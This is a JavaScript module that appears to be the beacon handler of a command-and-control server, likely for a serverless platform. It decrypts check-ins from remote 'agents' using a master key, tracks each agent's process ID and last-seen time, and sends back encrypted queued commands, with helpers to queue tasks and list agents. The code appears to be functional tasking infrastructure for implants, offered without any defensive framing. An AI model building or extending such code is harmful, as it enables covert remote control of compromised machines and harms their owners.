import { decryptPayload, encryptResponse } from '../crypto.js';

// Agent registry (in production, use KV or D1)
const agents = new Map();

export async function handleBeacon(request, env, agentId, body) {
  if (!body) {
    return new Response(JSON.stringify({error: 'Empty beacon'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
  
  // Decrypt beacon payload
  const decrypted = await decryptPayload(body, env.MASTER_KEY);
  if (!decrypted) {
    return new Response(JSON.stringify({error: 'Decryption failed'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
  
  try {
    const beacon = JSON.parse(new TextDecoder().decode(decrypted));
    
    // Update agent last seen
    const agent = agents.get(agentId) || {id: agentId, first_seen: Date.now(), commands: []};
    agent.last_seen = Date.now();
    agent.version = beacon.v || 0;
    agent.pid = beacon.pid || 0;
    agents.set(agentId, agent);
    
    // Check for pending commands
    const pendingCommands = agent.commands.filter(c => !c.sent);
    if (pendingCommands.length > 0) {
      const encrypted = await encryptResponse(pendingCommands, env.MASTER_KEY);
      return new Response(encrypted, {status: 200, headers: {'Content-Type': 'application/octet-stream'}});
    }
    
    // No commands - return empty OK
    return new Response(new Uint8Array([0]), {status: 200, headers: {'Content-Type': 'application/octet-stream'}});
    
  } catch (e) {
    return new Response(JSON.stringify({error: 'Invalid beacon format'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
}

export function queueCommand(agentId, command) {
  const agent = agents.get(agentId);
  if (agent) {
    agent.commands.push({...command, sent: false, queued_at: Date.now()});
  }
}

export function getAgent(agentId) {
  return agents.get(agentId);
}

export function getAllAgents() {
  return Array.from(agents.values());
}